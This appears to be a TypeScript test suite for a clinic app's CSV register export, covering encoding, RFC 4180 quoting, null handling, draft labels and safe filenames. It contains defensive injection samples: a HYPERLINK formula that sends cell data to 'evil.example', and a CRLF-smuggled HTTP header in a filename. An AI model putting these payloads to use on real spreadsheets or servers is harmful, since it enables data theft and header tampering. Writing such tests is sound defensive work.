import assert from "node:assert/strict";
import { test } from "node:test";

import {
  buildRegisterCsv,
  registerExportFilename,
  REGISTER_EXPORT_COLUMNS,
  type RegisterExportRow,
} from "../../src/lib/register-export.ts";

/**
 * The export is the one place patient data leaves this app as a file someone
 * else's software opens. Everything asserted here is a property of that file
 * rather than of the code that wrote it: what a spreadsheet will do with the
 * bytes, not what the function meant to say.
 */

const BOM = "\uFEFF";
const HEADER = REGISTER_EXPORT_COLUMNS.join(",");

/** 10:45 IST on 14 July 2026. */
const OCCURRED_AT = "2026-07-14T05:15:00Z";

function row(overrides: Partial<RegisterExportRow> = {}): RegisterExportRow {
  return {
    occurred_at: OCCURRED_AT,
    patient_name: "Sunita Devi",
    age_years: 42,
    diagnosis: "Viral fever",
    treatment: "Rest and fluids",
    is_new_patient: false,
    visit_number: 3,
    status: "committed",
    drugs: ["Paracetamol 650mg BD"],
    fees_inr: 300,
    ...overrides,
  };
}

/** The data rows, with the BOM, header and trailing CRLF taken off. */
function dataLines(csv: string): string[] {
  assert.equal(csv.startsWith(`${BOM}${HEADER}\r\n`), true, "BOM and header must lead the file");
  assert.equal(csv.endsWith("\r\n"), true, "every record ends with CRLF");
  return csv.slice(BOM.length + HEADER.length + 2, -2).split("\r\n");
}

test("an empty register is a header, not an empty file", () => {
  // A doctor with no visits in the range still gets a file they can open and a
  // header row that tells them the range really was empty.
  assert.equal(buildRegisterCsv([]), `${BOM}${HEADER}\r\n`);
});

test("a visit becomes one CRLF-terminated record in IST", () => {
  const csv = buildRegisterCsv([row()]);

  assert.deepEqual(dataLines(csv), [
    "2026-07-14,10:45,Sunita Devi,42,3,No,Viral fever,Rest and fluids,Paracetamol 650mg BD,300,Confirmed",
  ]);
  // A lone LF is tolerated by most readers; RFC 4180 says CRLF, and Excel on
  // Windows is the reader that matters here.
  assert.equal(/(?<!\r)\n/.test(csv), false, "a record ended with a bare LF");
});

test("a Devanagari name survives the BOM and is not escaped", () => {
  // The normal case in these clinics, not an edge case: without the BOM Excel
  // decodes the file in the machine's ANSI codepage and this becomes mojibake.
  const csv = buildRegisterCsv([row({ patient_name: "सुनीता देवी", diagnosis: "बुखार" })]);

  assert.equal(csv.charCodeAt(0), 0xfeff);
  assert.equal(csv.includes("सुनीता देवी"), true);
  assert.equal(csv.includes("बुखार"), true);
  // Devanagari needs no quoting; quoting it anyway would be a sign the escape
  // rule is keying on "not ASCII" rather than on the RFC's character set.
  assert.equal(csv.includes('"सुनीता देवी"'), false);
});

test("commas, quotes and newlines are quoted the way RFC 4180 says", () => {
  const csv = buildRegisterCsv([
    row({
      patient_name: 'Devi, Sunita "Guddi"',
      diagnosis: "Fever\r\nwith chills",
      treatment: "Rest",
      drugs: ["Paracetamol 650mg", "ORS sachets"],
    }),
  ]);

  const record = csv.slice(BOM.length + HEADER.length + 2, -2);
  assert.equal(record.includes('"Devi, Sunita ""Guddi"""'), true);
  assert.equal(record.includes('"Fever\r\nwith chills"'), true);
  // A multi-drug cell must not split into two columns, so the joiner is not a
  // bare comma.
  assert.equal(record.includes("Paracetamol 650mg; ORS sachets"), true);
});

test("a cell a spreadsheet would run as a formula is neutralised", () => {
  // Excel and Sheets execute a cell whose text starts with one of these. In a
  // multi-doctor clinic the name and diagnosis are typed by a colleague, so
  // this is attacker-influenced text landing in a file an accountant opens.
  const dangerous = [
    '=HYPERLINK("https://evil.example/"&A1,"Click")',
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
  ];

  for (const value of dangerous) {
    const record = dataLines(buildRegisterCsv([row({ patient_name: value })]))[0];
    const cell = record.split(",")[2];
    assert.equal(
      cell.startsWith("'") || cell.startsWith('"\''),
      true,
      `${JSON.stringify(value)} reached the sheet as a live formula`,
    );
  }
});

test("neutralising a formula does not corrupt ordinary text", () => {
  const csv = buildRegisterCsv([row({ diagnosis: "Fever = 102F", treatment: "Tab. Crocin @ night" })]);

  // Only the *leading* character makes a formula, so an equals sign or an @
  // inside a sentence must be left exactly as the doctor dictated it.
  assert.equal(csv.includes("Fever = 102F"), true);
  assert.equal(csv.includes("Tab. Crocin @ night"), true);
  assert.equal(csv.includes("'Fever"), false);
});

test("a missing fee is an empty cell, not a zero", () => {
  // A visit with no recorded amount and a free visit are different facts, and
  // an accountant summing the column must not be handed the wrong one.
  const withNull = dataLines(buildRegisterCsv([row({ fees_inr: null })]))[0];
  const withNothing = dataLines(buildRegisterCsv([row({ fees_inr: undefined })]))[0];
  const expected =
    "2026-07-14,10:45,Sunita Devi,42,3,No,Viral fever,Rest and fluids,Paracetamol 650mg BD,,Confirmed";

  assert.equal(withNull, expected);
  assert.equal(withNothing, expected);
});

test("missing clinical fields are blank rather than the word null", () => {
  const record = dataLines(
    buildRegisterCsv([
      row({
        age_years: null,
        visit_number: null,
        is_new_patient: null,
        diagnosis: null,
        treatment: null,
        drugs: [],
        fees_inr: null,
      }),
    ]),
  )[0];

  assert.equal(record, "2026-07-14,10:45,Sunita Devi,,,,,,,,Confirmed");
});

test("a draft is labelled the way the register labels it", () => {
  // The house rule is that nothing an LLM produced is a confirmed record until
  // a doctor says so. That has to hold in the exported file too, or an
  // unreviewed draft reads as signed clinical history in someone's archive.
  const drafted = dataLines(buildRegisterCsv([row({ status: "draft" })]))[0];
  assert.equal(drafted.endsWith(",Needs review"), true);
});

test("an unparseable timestamp blanks its own cells and keeps the row", () => {
  // `Intl.DateTimeFormat.format()` throws on an Invalid Date. One bad
  // timestamp must not cost the doctor the rest of the register.
  const record = dataLines(buildRegisterCsv([row({ occurred_at: "not-a-timestamp" })]))[0];
  assert.equal(record.startsWith(",,Sunita Devi,"), true);
});

test("the filename carries the range and cannot extend the header", () => {
  assert.equal(
    registerExportFilename("2026-07-01", "2026-07-31"),
    "register-2026-07-01-to-2026-07-31.csv",
  );
  // Content-Disposition is built by interpolation, so a quote or a CRLF in the
  // range would otherwise let a caller write the rest of the header.
  assert.equal(
    registerExportFilename('2026-07-01"\r\nX-Injected: 1', "2026-07-31"),
    "register-2026-07-01-1-to-2026-07-31.csv",
  );
});
